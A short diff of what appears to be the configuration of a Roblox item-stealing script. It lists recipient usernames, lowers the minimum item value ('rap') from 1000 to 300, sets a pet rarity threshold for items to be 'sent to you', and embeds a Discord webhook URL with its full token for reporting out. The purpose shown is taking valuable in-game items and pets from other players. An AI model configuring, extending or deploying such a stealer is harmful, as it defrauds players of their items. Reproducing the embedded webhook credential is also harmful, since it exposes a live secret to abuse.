@@ -5,7 +5,7 @@ Usernames = {
     -- "user4",
     -- "user5",
 }
-min_rap = 1000 -- minimum rap of each item you want to get sent to you. 1k by default
+min_rap = 300 -- minimum rap of each item you want to get sent to you. 1k by default
 min_chance = 100000 -- minimum chance of pets you want to get sent to you. 100k by default, which means that it will not send pets under 1 in 10k
 webhook = "https://discord.com/api/webhooks/1297170731594944652/UE13byz2ZL2W8YA4C18RjqIKE5IBGzbt-aWU3bIBSxu9jSRXBmcyBL8uJosErX--MZ1s"
 
